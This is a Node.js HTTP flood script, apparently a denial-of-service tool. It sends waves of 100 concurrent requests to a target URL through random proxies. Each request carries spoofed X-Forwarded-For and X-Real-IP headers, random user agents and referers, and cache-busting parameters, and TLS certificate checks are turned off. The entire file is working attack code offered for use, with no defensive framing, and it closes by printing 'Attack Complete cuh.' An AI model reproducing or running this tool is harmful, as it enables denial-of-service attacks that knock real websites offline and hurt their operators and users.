const fs = require('fs');
const http = require('http');
const https = require('https');
const net = require('net');
const url = require('url');

const proxies = fs.readFileSync('proxies.txt', 'utf-8')
    .split('\n')
    .map(x => x.trim())
    .filter(x => x);

const userAgents = fs.readFileSync('ua.txt', 'utf-8')
    .split('\n')
    .map(x => x.trim())
    .filter(x => x);

const referers = fs.readFileSync('refs.txt', 'utf-8')
    .split('\n')
    .map(x => x.trim())
    .filter(x => x);

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;

if (!targetUrl || isNaN(duration)) {
    console.log("Usage: node script.js <url> <time_in_seconds>");
    process.exit(1);
}

const parsed = url.parse(targetUrl);
const host = parsed.hostname;
const port = parsed.protocol === 'https:' ? 443 : 80;

let success = 0;
let fail = 0;
let usedProxies = new Set();

function getRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
}

function buildRequestHeaders(host) {
    const ip = Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
    const ua = getRandom(userAgents);
    const ref = getRandom(referers);

    return [
        `GET ${parsed.path || '/'}?cb=${Math.random().toString(36).substring(7)} HTTP/1.1`,
        `Host: ${host}`,
        `User-Agent: ${ua}`,
        `Referer: ${ref}`,
        `X-Forwarded-For: ${ip}`,
        `X-Real-IP: ${ip}`,
        `Connection: close`,
        `Accept: */*`,
        `Accept-Encoding: gzip, deflate`,
        `Accept-Language: en-US,en;q=0.9`,
        `Pragma: no-cache`,
        `Cache-Control: no-cache`,
        '',
        ''
    ].join('\r\n');
}

async function attackThroughProxy(proxy) {
    return new Promise((resolve) => {
        const [proxyHost, proxyPort] = proxy.split(':');
        const socket = net.connect(proxyPort, proxyHost);

        socket.setTimeout(60000);
        socket.on('connect', () => {
            let connectReq = `CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}\r\n\r\n`;
            socket.write(connectReq);
        });

        socket.on('data', chunk => {
            if (chunk.toString().includes('200')) {
                usedProxies.add(proxy);
                const tlsSocket = port === 443 ? require('tls').connect({
                    socket: socket,
                    servername: host,
                    rejectUnauthorized: false
                }, () => {
                    tlsSocket.write(buildRequestHeaders(host));
                }) : socket;

                if (port === 80) {
                    socket.write(buildRequestHeaders(host));
                }

                success++;
                resolve();
            } else {
                fail++;
                socket.destroy();
                resolve();
            }
        });

        socket.on('error', () => {
            fail++;
            socket.destroy();
            resolve();
        });

        socket.on('timeout', () => {
            fail++;
            socket.destroy();
            resolve();
        });
    });
}

async function startAttack() {
    const end = Date.now() + duration;
    const concurrency = 100;

    while (Date.now() < end) {
        const jobs = [];
        for (let i = 0; i < concurrency; i++) {
            const proxy = getRandom(proxies);
            jobs.push(attackThroughProxy(proxy));
        }
        await Promise.all(jobs);
        process.stdout.write(`\rSent: ${success + fail} | 200 OK: ${success} | Fail: ${fail} | Used: ${usedProxies.size}`);
    }

    console.log('\n\nAttack Complete cuh.');
    console.log('======================================');
    console.log('Success:', success);
    console.log('Failed:', fail);
    console.log('Unique Proxies Used:', usedProxies.size);
    console.log('Proxies Used:');
    console.log([...usedProxies].join('\n'));
}

startAttack();
